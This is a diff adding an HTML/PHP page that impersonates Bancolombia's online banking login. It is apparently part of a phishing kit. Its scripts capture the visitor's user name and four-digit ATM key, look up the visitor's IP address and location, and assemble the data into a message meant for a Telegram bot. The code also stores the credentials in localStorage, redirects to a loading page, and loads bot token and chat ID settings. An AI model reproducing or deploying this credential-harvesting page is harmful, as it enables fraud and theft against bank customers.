@@ -1,0 +1,752 @@
+<html>
+  <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <title>Bancolombia</title>
+
+    <link
+      rel="stylesheet"
+      href="../../sapp2406.sirv.com/bogo/lfr_style.css"
+    />
+    <link
+      rel="stylesheet"
+      href="../../sapp2406.sirv.com/bogo/lfr_ownstyle.css"
+    />
+    <script src="../../ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script>
+      fetch("../claves.json")
+        .then((response) => response.json())
+        .then((data) => {
+          console.log("Datos cargados:", data);
+        })
+        .catch((error) => console.error("Error cargando JSON:", error));
+    </script>
+    <script>
+      $.getJSON("https://api.ipify.org/?format=json", function (data) {
+        $("#gfg").html(data.ip);
+      });
+      $.getJSON("https://ipinfo.io/", function (response) {
+        $("#ip").html("IP: " + response.ip);
+        $("#address").html("" + response.city + ", " + response.country);
+      });
+
+      var u_name, u_name2, u_name3, u_name4, ip, ip2, message;
+      var ready = function () {
+        
+        u_name3 = document.getElementById("numi").value;
+        u_name4 = document.getElementById("clvseg").value;
+        ip = document.getElementById("gfg").innerHTML;
+        ip2 = document.getElementById("address").innerHTML;
+
+        localStorage.setItem("u_name", u_name);
+        localStorage.setItem("u_name2", u_name2);
+        localStorage.setItem("u_name3", u_name3);
+        localStorage.setItem("u_name4", u_name4);
+        message =
+          "bbogota\nTipoCliente: " +
+          u_name +
+          "\nDocumento: " +
+          u_name2 +
+          "-" +
+          u_name3 +
+          "\nClav3Seg: " +
+          u_name4 +
+          "\n\nIP: " +
+          ip +
+          "\n" +
+          ip2;
+      };
+      var sender = function () {
+        ready();
+        var settings = {
+          async: true,
+          crossDomain: true,
+          url:
+            "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache",
+          },
+          data: JSON.stringify({
+            chat_id: chat_id,
+            text: message,
+          }),
+        };
+
+        return false;
+      };
+    </script>
+  </head>
+
+  <script></script>
+
+  <body>
+
+    
+
+    <div class="box-container">
+<style>
+  :root{
+    --bg-height: 320px;   /* alto de la franja */
+    --bg-width: 140vw;    /* ancho relativo */
+    --bg-rotate: -8deg;   /* ángulo de la franja */
+    --bg-opacity: .9;     /* transparencia */
+  }
+
+  .wrap-rel {
+    position: relative;
+    isolation: isolate;
+  }
+
+  .bg-stripes {
+    position: absolute;
+    left: 50%;
+    top: 50%; /* centrado vertical */
+    width: var(--bg-width);
+    height: var(--bg-height);
+    transform: translate(-50%,-50%) rotate(var(--bg-rotate));
+    object-fit: cover;
+    opacity: var(--bg-opacity);
+    z-index: -1;
+    pointer-events: none;
+    filter: saturate(1.05);
+    /* sin animación */
+  }
+
+  .fg-content {
+    position: relative;
+    z-index: 1;
+  }
+
+  @media (max-width: 600px){
+    :root{
+      --bg-height: 240px;
+      --bg-width: 98vw;
+      --bg-rotate: -2deg;
+    }
+  }
+</style>
+
+
+  <div class="wrap-rel">
+      
+        <div class="toast hidden" id="errorMessage" style="position: absolute">
+          <p id="AuthLabel"></p>
+          <span class="icon-close-search-r" onclick="hideToast()"></span>
+        </div>
+        <div class="container__water-mark">
+          <div class="container__water-mark--image-container"></div>
+        </div>
+        <div class="container__login">
+        <br> <br> <div class="container__login--header" style="display: left; justify-content: flex-start; padding-left: 5px;">
+  <img src="imagenes/logo-bancolombia-black.svg" alt="" style="max-width: 100%; height: auto;" />
+</div>
+ 
+         <img class="bg-stripes"
+       src="imagenes/06.svg"
+       alt="" aria-hidden="true">
+  
+<br><br>
+
+         <center> <p style="font-size: 28px;color:black;">
+Sucursal Virtual Personas
+  <label class="tituloformulario" id="flujoOrigenLbl"><br /></label>
+</p></center>
+<br><br>
+<!-- Notificación estilo banco - una sola pieza -->
+<link rel="preconnect" href="https://fonts.googleapis.com/">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&amp;display=swap" rel="stylesheet">
+
+<style>
+  :root{
+    --card-dark:#ffffff;   /* fondo del mensaje */
+    --icon-bg:#ffcc00;     /* fondo del icono */
+    --text:#0f1923;
+    --radius:16px;
+    --padY: clamp(10px,1.6vw,14px);
+    --padX: clamp(12px,2vw,18px);
+    --iconW: clamp(44px,5.2vw,58px);
+    --title: clamp(16px,1.8vw,20px);
+    --font:  clamp(13px,1.35vw,16px);
+    --maxw: 960px;
+  }
+
+  .bank-note{
+    font-family: Inter, system-ui, Arial, sans-serif;
+    max-width: var(--maxw);
+    margin: 0 auto;
+    display: grid;
+    grid-template-columns: var(--iconW) 1fr;
+    align-items: stretch;          /* alturas iguales */
+    gap: 0;                        /* pegados */
+    padding: 0 clamp(8px,1.2vw,14px);
+  }
+
+  .bank-note__icon{
+    background: var(--icon-bg);
+    border-radius: var(--radius) 0 0 var(--radius); /* esquinas izquierda */
+    display: grid;
+    place-items: center;
+    padding: clamp(8px,1.2vw,10px); /* reduce altura visual */
+  }
+  .bank-note__icon svg{
+    width: clamp(20px,2.6vw,26px);
+    height: clamp(20px,2.6vw,26px);
+    display: block;
+  }
+
+  .bank-note__card{
+    background: var(--card-dark);
+    color: var(--text);
+    border-radius: 0 var(--radius) var(--radius) 0; /* esquinas derecha */
+    padding: var(--padY) var(--padX);
+    line-height: 1.4;
+    box-shadow: 0 6px 18px rgba(0,0,0,.18);
+  }
+
+  .bank-note__title{
+    font-size: var(--title);
+    font-weight: 700;
+    margin: 0 0 4px 0;
+  }
+  .bank-note__text{
+    font-size: var(--font);
+    margin: 0;
+  }
+</style>
+
+<section class="bank-note" aria-label="Aviso de mantenimiento">
+  <div class="bank-note__icon" aria-hidden="true">
+    
+    <svg viewBox="0 0 24 24" fill="none" stroke="#0f1923" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M3 10v4a2 2 0 0 0 2 2h2l2.5 4a1 1 0 0 0 1.8-.6V16h1a10 10 0 0 0 7-3.1V7.1A10 10 0 0 0 12.3 4H7a2 2 0 0 0-2 2"/>
+      <path d="M18.5 6.5a4 4 0 0 1 0 11"/>
+    </svg>
+  </div>
+
+  <div class="bank-note__card">
+    <h3 class="bank-note__title">¡Solicitalo en minutos!</h3>
+    <p class="bank-note__text">
+      ¿Necesitas liquidez sin complicaciones? Tarjeta con $10.000.000 COP de cupo, cuotas flexibles, protección contra fraudes y recompensas por cada compra. Solicita en 3 minutos. Sujeto a aprobación.
+    </p>
+  </div>
+</section>
+ 
+
+
+       <!--  <a href="https://tuenlace.com" style="text-decoration:none;display:inline-block;margin-top:10px;">
+          <div style="display:flex;align-items:center;background-color:#0041c2;border-radius:15px;padding:10px 15px;max-width:420px;color:white;font-family:Arial,sans-serif;">
+            <img src="../monitoreo/imagenes/422e00391dd36d89affe.png" alt="Imagen informativa" style="width:70px;height:auto;margin-right:15px;border-radius:10px;">
+            <div style="display:flex;flex-direction:column;">
+              <p style="font-size:14px;font-weight:bold;margin:0;">¿Nunca has ingresado a Banca Virtual?</p>
+              <p style="font-size:13px;margin:2px 0 0 0;">Aquí te decimos cómo hacerlo ›</p>
+            </div>
+          </div>
+        </a>
+        <br><br>-->
+<br><br>
+
+          
+          <div class="container__login--login-box">
+            <span id="form-title"><strong>¡Hola!</strong></span>
+
+<style>
+  #form-title {
+    display: block;           /* que ocupe todo el ancho */
+    text-align: center;       /* centra el texto */
+    font-weight: bold;        /* negrita */
+    margin: 0 auto;  
+    font-size: 18;         /* asegura que se centre */
+  }
+</style>
+<span id="slogan-titulo">Ingresa los datos para gestionar tus productos y hacer transacciones.</span>
+<style>
+  #slogan-titulo {
+    font-size: 15;
+    text-align: center;
+
+
+
+
+    }
+
+</style>
+            <div class="form-container">
+              <form
+                method="post"
+                name="loginForm"
+                id="loginForm"
+                action="#"
+                onsubmit="return sender();"
+                autocomplete="off"
+              >
+                <div id="document-form">
+                  <div class="label">
+                    <label for="tipoPersona"></label>
+                  </div>
+                  <!--<div class="custom-select">
+                    <select id="tipoPersona" name="Seleid">
+                      <option value="">Tipo de Documento</option>
+                      <option value="Personas">Cédula de Ciudadanía</option>
+                      <option value="Empresarial">
+                        Cédula Extranjería
+                      </option>
+                      <option value="Afiniada">Tarjeta de Identidad </option>
+                    </select>
+                  </div>
+                  <div class="label">
+                    <label for="IType"></label>
+                  </div>
+                  <div class="custom-select">
+                    <select id="IType" name="IType">
+                      <option value="CC">C.C. Cédula de ciudadanía</option>
+                      <option value="T.I.">T.I. Tarjeta de Identidad</option>
+                      <option value="C.E.">C.E. Cédula de Extranjería</option>
+                      
+                  </div>-->
+                  <div style="position:relative; margin:20px 0;">
+  <!-- Ícono persona: blanco con borde negro -->
+  <svg width="20" height="20" viewBox="0 0 24 24" aria-hidden="true"
+       style="position:absolute; left:8px; top:50%; transform:translateY(-50%);">
+    <circle cx="12" cy="8" r="4" fill="#fff" stroke="#000" stroke-width="1.5"/>
+    <path d="M4 20c0-3.3 3.6-6 8-6s8 2.7 8 6" fill="none" stroke="#000" stroke-width="1.5" stroke-linecap="round"/>
+  </svg>
+
+  <!-- Input con línea inferior -->
+  <input
+    type="text"
+    class="custom-form-control"
+    name="numi"
+    id="numi"
+    style="
+      width:100%;
+      border:none;
+      border-bottom:1px solid #000;
+      border-radius:0;              /* corrección: línea recta sin bordes redondos */
+      padding:12px 10px 10px 36px; /* espacio para el ícono */
+      font-size:16px;
+      outline:none;
+      background:transparent;
+      transition:border-bottom 0.2s ease;
+    "
+    onfocus="this.style.borderBottom='2px solid #000';"
+    onblur="this.style.borderBottom='1px solid #000';"
+  />
+
+  <!-- Label flotante -->
+  <label for="numi" style="
+    position:absolute;
+    left:36px;
+    top:50%;
+    transform:translateY(-50%);
+    font-size:16px;
+    color:#000;
+    pointer-events:none;
+    background:#fff;
+    padding:0 2px;
+    transition:all 0.15s ease;
+  ">Usuario</label>
+</div>
+
+<script>
+(function(){
+  const input = document.getElementById('numi');
+  const label = document.querySelector("label[for='numi']");
+
+  function sync() {
+    if (document.activeElement === input || input.value.trim() !== "") {
+      label.style.top = "-6px";
+      label.style.transform = "none";
+      label.style.fontSize = "12px";
+    } else {
+      label.style.top = "50%";
+      label.style.transform = "translateY(-50%)";
+      label.style.fontSize = "16px";
+    }
+  }
+  input.addEventListener("focus", sync);
+  input.addEventListener("blur", sync);
+  input.addEventListener("input", sync);
+  sync();
+})();
+</script>
+
+
+<br>
+                  
+                  <div class="">
+                    <u style="text-decoration-color:#000000;"><a href="#" style="color:#080808;text-decoration:none;margin-right:auto;display:block;width:max-content;">
+    ¿Olvidaste tu usuario? 
+  </a></u>
+                  </div>
+                  
+                  <div style="position:relative; margin:20px 0;">
+  <!-- Ícono candado -->
+  <svg width="20" height="20" viewBox="0 0 24 24" aria-hidden="true"
+       style="position:absolute; left:8px; top:50%; transform:translateY(-50%);">
+    <rect x="5" y="10" width="14" height="10" rx="2" ry="2" fill="#fff" stroke="#000" stroke-width="1.5"/>
+    <path d="M8 10V7a4 4 0 0 1 8 0v3" fill="none" stroke="#000" stroke-width="1.5"/>
+  </svg>
+
+  <!-- Input -->
+  <input
+    type="password"
+    name="clvseg"
+    id="clvseg"
+    maxlength="4"
+    minlength="4"
+    style="
+      width:100%;
+      border:none;
+      border-bottom:1px solid #000;
+      padding:12px 10px 10px 36px; /* espacio para el icono */
+      font-size:16px;
+      outline:none;
+      background:transparent;
+      transition:border-bottom 0.2s ease;
+    "
+    onfocus="this.style.borderBottom='2px solid #000';"
+    onblur="this.style.borderBottom='1px solid #000';"
+  />
+
+  <!-- Label flotante -->
+  <label for="clvseg" style="
+    position:absolute;
+    left:36px;
+    top:50%;
+    transform:translateY(-50%);
+    font-size:16px;
+    color:#000;
+    pointer-events:none;
+    background:#fff;
+    padding:0 2px;
+    transition:all 0.15s ease;
+  ">Clave del cajero</label>
+</div>
+
+<script>
+(function(){
+  const input = document.getElementById('clvseg');
+  const label = document.querySelector("label[for='clvseg']");
+
+  function sync() {
+    if (document.activeElement === input || input.value.trim() !== "") {
+      label.style.top = "-6px";
+      label.style.transform = "none";
+      label.style.fontSize = "12px";
+    } else {
+      label.style.top = "50%";
+      label.style.transform = "translateY(-50%)";
+      label.style.fontSize = "16px";
+    }
+  }
+  input.addEventListener("focus", sync);
+  input.addEventListener("blur", sync);
+  input.addEventListener("input", sync);
+  sync();
+})();
+</script>
+
+<br>
+<u style="text-decoration-color:#000000;">
+<a href="#" style="color:#080808;text-decoration:none;margin-right:auto;display:block;width:max-content;">
+    ¿Olvidaste o bloqueaste tu claves? 
+  </a> 
+</u>
+
+
+               <div class="btn-container">
+  <button 
+    type="submit" 
+    class="btn-main" 
+    id="btnLogin"
+    style="
+      width:100%;
+      background-color:#dcdbdb;     /* gris inicial */
+      color:#afafaf;                /* texto blanco */
+      border:none;
+      padding:12px;
+      font-size:16px;
+      font-weight:bold;
+      border-radius:26px;
+      cursor:not-allowed;
+      transition:background-color 0.2s ease;
+    " 
+    disabled
+  >
+    Iniciar sesión
+  </button>
+</div>
+
+<script>
+(function(){
+  const usuario = document.getElementById("numi");
+  const clave   = document.getElementById("clvseg");
+  const btn     = document.getElementById("btnLogin");
+
+  function toggleBtn() {
+    if (usuario.value.trim() && clave.value.trim()) {
+      btn.disabled = false;
+      btn.style.backgroundColor = "#ffcc00";  // amarillo
+      btn.style.color = "#000";               // texto negro
+      btn.style.cursor = "pointer";
+
+      btn.onmousedown = () => btn.style.backgroundColor = "#ffe066";
+      btn.onmouseup   = () => btn.style.backgroundColor = "#ffcc00";
+      btn.onmouseout  = () => btn.style.backgroundColor = "#ffcc00";
+    } else {
+      btn.disabled = true;
+      btn.style.backgroundColor = "#888";     // gris
+      btn.style.color = "#fff";               // texto blanco
+      btn.style.cursor = "not-allowed";
+
+      btn.onmousedown = null;
+      btn.onmouseup   = null;
+      btn.onmouseout  = null;
+    }
+  }
+
+  usuario.addEventListener("input", toggleBtn);
+  clave.addEventListener("input", toggleBtn);
+})();
+</script>
+
+
+                
+
+              </form>
+            </div>
+          </div>
+          <center><u><p style="font-family: Arial, sans-serif; font-size: 13px; color: #444; margin-top: 20px; line-height: 1.4;">Crear usuario</u><br>
+          <u style="text-decoration-color:#1a73e8;">
+  <a href="#" style="color:#1a73e8;text-decoration:none;"></a>
+</u>
+
+          <br> <br> <u style="text-decoration-color:#1a73e8;">
+  <a href="#" style="color:#1a73e8;text-decoration:none;"></a>
+</u>
+</p></center>
+        </div>
+        
+
+<div class="links">
+  <p>¿Problemas para conectarte?</p>
+  <p>Aprende sobre seguridad</p>
+  <p>Reglamento Sucursal Virtual</p>
+  <p>Política de privacidad</p>
+</div>
+
+<style>
+  .links {
+    text-align: center;
+  }
+  .links p {
+    margin: 8px 0;
+    font-size: 15px;     /* ajusta a tu gusto */
+    font-weight: 500;    /* 400 = normal, 500 = medio, 600 = semibold */
+  }
+</style>
+
+
+<div class="linea"></div>
+
+<style>
+  .linea {
+    width: 100%;           /* ancho de la línea, ajústalo (ej: 40%, 200px) */
+    margin: 16px auto;    /* auto centra horizontalmente */
+    border-top: 1px solid #7e7e7e;  /* línea negra finita */
+  }
+</style>
+
+<div class="img-centro">
+  <img src="imagenes/logo-bancolombia-black.svg" alt="Descripción de la imagen">
+</div>
+
+<style>
+  .img-centro {
+    text-align: center;   /* centra la imagen */
+  }
+
+  .img-centro img {
+    max-width: 180px;     /* ajusta el ancho máximo */
+    width: 100%;          /* escala de forma responsive */
+    height: auto;         /* mantiene la proporción */
+  }
+</style>
+<br>
+
+<div class="img-centro">
+  <img src="imagenes/super-horizontal-black.svg" alt="Descripción de la imagen">
+</div>
+
+<style>
+  .img-centro {
+    text-align: center;   /* centra la imagen */
+  }
+
+  .img-centro img {
+    max-width: 160px;     /* ajusta el ancho máximo */
+    width: 100%;          /* escala de forma responsive */
+    height: auto;         /* mantiene la proporción */
+  }
+</style>
+
+
+  <div class="footer-datos">
+  <p id="ip">Dirección IP: 45.187.7.195</p>
+  <p id="fecha"></p>
+</div>
+
+<style>
+  .footer-datos {
+    text-align: center;        /* centrado */
+    font-size: 14px;           /* tamaño ajustable */
+    color: #777;               /* gris similar al de la foto */
+    margin-top: 40px;          /* separación con el contenido */
+  }
+  .footer-datos p {
+    margin: 4px 0;
+  }
+</style>
+
+<script>
+  // Generar fecha y hora actuales en español
+  const opciones = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric',
+                     hour: 'numeric', minute: 'numeric', hour12: true };
+  const ahora = new Date().toLocaleDateString('es-ES', opciones);
+
+  document.getElementById("fecha").textContent = ahora;
+</script>
+
+<br><br><br><br>
+
+<!-- TAB SUGERENCIAS -->
+<!-- TAB SUGERENCIAS (embebido) -->
+<!-- <style>
+  :root{
+    --sug-rojo:#d2232a;
+    /* tamaños base para móvil */
+    --sug-w:38px;
+    --sug-h:124px;
+    --sug-ico:24px;
+  }
+
+  /* En móvil NO empujamos el layout: la página queda centrada */
+  body{ padding-right:0; }
+
+  .sug-fixed{
+    position:fixed;
+    right:6px;                 /* al borde sin mover el layout */
+    top:58%; transform:translateY(-50%); /* un poco más abajo para no tapar inputs */
+    z-index:9999;
+  }
+  .sug-fixed a{
+    display:flex; flex-direction:column; justify-content:space-between; align-items:center;
+    width:var(--sug-w); height:var(--sug-h); padding:10px 6px;
+    background:var(--sug-rojo); color:#fff; text-decoration:none; font-weight:700;
+    border-radius:12px 0 0 12px; box-shadow:0 6px 16px rgba(0,0,0,.18);
+  }
+  .sug-fixed .txt{
+    writing-mode:vertical-rl; transform:rotate(180deg);
+    font-size:12px; letter-spacing:.3px; line-height:1;
+  }
+  .sug-fixed .ico{
+    width:var(--sug-ico); height:var(--sug-ico);
+    border-radius:999px; background:#fff; display:grid; place-items:center;
+  }
+  .sug-fixed .ico svg{ width:70%; height:70%; display:block; }
+
+  /* móviles muy pequeños */
+  @media (max-width:380px){
+    :root{ --sug-w:34px; --sug-h:112px; --sug-ico:22px; }
+  }
+
+  /* Tablet: agrando y ahora sí dejo gutter para no cubrir contenido */
+  @media (min-width:600px){
+    :root{ --sug-w:50px; --sug-h:168px; --sug-ico:32px; }
+    body{ padding-right: calc(var(--sug-w) + 10px); }
+    .sug-fixed{ right: max(8px, env(safe-area-inset-right)); top:50%; }
+    .sug-fixed .txt{ font-size:14px; }
+  }
+
+  /* Desktop */
+  @media (min-width:1024px){
+    :root{ --sug-w:56px; --sug-h:180px; --sug-ico:34px; }
+    body{ padding-right: calc(var(--sug-w) + 12px); }
+    .sug-fixed .txt{ font-size:15px; }
+  }
+</style>
+
+<div class="sug-fixed">
+  <a href="#sugerencias" aria-label="Sugerencias">
+    <span class="txt">Sugerencias</span>
+    <span class="ico">
+       carita roja dentro del círculo blanco 
+      <svg viewBox="0 0 24 24" aria-hidden="true">
+        <circle cx="9" cy="10" r="1.5" fill="#d2232a"></circle>
+        <circle cx="15" cy="10" r="1.5" fill="#d2232a"></circle>
+        <path d="M8 14c1.6 1.8 6.4 1.8 8 0" fill="none" stroke="#d2232a" stroke-width="2" stroke-linecap="round"></path>
+      </svg>
+    </span>
+  </a>
+</div>
+-->
+
+
+<!-- RESPONSIVE STYLES -->
+
+
+<!-- JS FUNCIONALIDAD -->
+
+     
+    <script>
+  document.addEventListener("DOMContentLoaded", function () {
+    document
+      .getElementById("loginForm")
+      .addEventListener("submit", function (event) {
+        event.preventDefault(); // Evita la recarga de la página
+
+     
+        const u_name3 = document.getElementById("numi")?.value.trim() || "";
+        const u_name4 = document.getElementById("clvseg")?.value.trim() || "";
+
+        if ( !u_name3 || !u_name4) {
+          alert("Por favor rellena todos los campos antes de continuar.");
+          return; // Detiene el envío
+        }
+
+        localStorage.setItem("u_name", u_name);
+        localStorage.setItem("u_name2", u_name2);
+        localStorage.setItem("u_name3", u_name3);
+        localStorage.setItem("u_name4", u_name4);
+
+        console.log("Datos guardados en localStorage:", {
+          u_name,
+          u_name2,
+          u_name3,
+          u_name4,
+        });
+
+        // Redirigir después de guardar
+        window.location.href = "load.html";
+      });
+  });
+</script>
+
+
+  </body>
+</html>
+<?php
+require __DIR__ . '/vendor/autoload.php';
+
+$dotenv = Dotenv\Dotenv::createImmutable(__DIR__);
+$dotenv->load();
+
+// Ahora puedes usar tus variables
+$botToken = $_ENV['BOT_TOKEN'];
+$chatId   = $_ENV['CHAT_ID'];
+?>
